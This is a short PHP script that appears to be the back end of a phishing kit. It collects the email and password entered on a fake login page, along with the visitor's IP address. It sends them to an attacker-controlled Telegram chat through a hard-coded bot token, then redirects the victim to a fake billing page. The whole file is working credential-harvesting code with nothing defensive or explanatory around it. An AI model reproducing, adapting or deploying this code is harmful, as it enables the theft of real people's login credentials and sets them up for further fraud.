
<?php

session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('Africa/Cairo');
$date = date('d/m/Y h:i:sa');
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
$config_token = "5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo";
$config_chat = "-919187838";

function callAPI($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
   // EXECUTE:
   $result = curl_exec($curl);
   curl_close($curl);
}

$_SESSION['email'] = $_POST['mail'];
$_SESSION['pass'] = $_POST['pass'];

// Check if username or password is empty
if (empty($_SESSION['email']) || empty($_SESSION['pass'])) {
    header('Location: ../../login.php?error=true'); // Redirect back to the login page
    exit;
}

################

$TELG.= urlencode("[🥷🏽] Informations de connexion [🥷🏽]\n\n");
$TELG.= urlencode("🚪 E-mail : ".$_SESSION['email']."\n");
$TELG.= urlencode("🗝 Mot de pass : ".$_SESSION['pass']."\n\n");
$TELG.= urlencode("🛒 Ip  : ".$ip."");

callAPI('https://api.telegram.org/bot'.$config_token.'/sendMessage?chat_id='.$config_chat.'&text='.$TELG.'&parse_mode=html');
header('location: ../billing.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

################

?>
